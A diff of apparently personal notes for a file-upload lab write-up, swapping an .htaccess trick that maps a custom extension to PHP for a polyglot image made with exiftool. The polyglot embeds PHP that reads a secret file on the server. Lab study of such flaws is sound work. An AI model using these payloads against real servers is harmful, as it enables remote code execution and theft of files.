@@ -13,41 +13,38 @@
 
 ---
 
-## 🔍 2. Reconnaissance & Vulnerability Analysis
+## 🚀 2. Exploitation
 >As regular in this topic, this website has an image uploading function
 ![[Pasted image 20260804141802.png]]
 
-Base on the LAB's description, I'm going to create a 
+Based on the LAB's description, I'm going to create a polyglot image file using `exiftool.exe`
+First, I need a random .png (or .jpg) image file. Here I used a 1x1 pixel image file found on Wikipedia: https://en.wikipedia.org/wiki/File:1x1.png
 
----
-## 🚀 3. Exploitation
+Next, I injected a PHP script into the "comment" section of this image's metadata using the command:
+```bash
+exiftool.exe -comment="<?php echo '********'. file_get_contents('/home/carlos/secret') . '**********************' ?>" 1x1.png -o script.php
+```
+	(I have tested for a while and realize that the website only checks the file's content not its extension, so I simply put a direct .php)
 
-First, I tried to upload the [[Webshell script]] directly and this is the result:
- ![[Pasted image 20260803120810.png]]
- 
- The server blacklisted .php extension. But the key is, I'm allowed to upload .htaccess file to configure the setting of this Apache server. So that, I added a new file exstension named .bachphan and declare its MIME type to an executable one:
- ```htaccess
- AddType application/x-httpd-php .bachphan
- ```
- 
- I modified my script extension to `script.bachphan` after uploading the `.htaccess` configuration file and it worked !
-![[Pasted image 20260803121546.png]]
+![[Pasted image 20260804142918.png]]
 
+ BOOM ! It worked 
+ ![[Pasted image 20260804142959.png]]
+ I got the secret password between the "\*"s
 
-![[Pasted image 20260803121751.png]]
 
 ---
 
-## ⚡ 4. PoC / Final Payload
+## ⚡ 3. PoC / Final Payload
 
-Configuration file: 
- ```htaccess
- AddType application/x-httpd-php .bachphan
- ```
-Script name: `script.bachphan`
-[[Webshell script]]
+Script name: `script.php
+```bash
+exiftool.exe -comment="<?php echo '********'. file_get_contents('/home/carlos/secret') . '**********************' ?>" 1x1.png -o script.php
+```
+
 ---
-## 💡 5. Key Takeaways & Remediation
+
+## 💡 4. Key Takeaways & Remediation
 
 - **Key Concept:** Upload a malicious PHP script into the 'Avatar Upload' section to gain the system's control
 - **Remediation:** [[Preventing File Upload Vulnerabilities]]
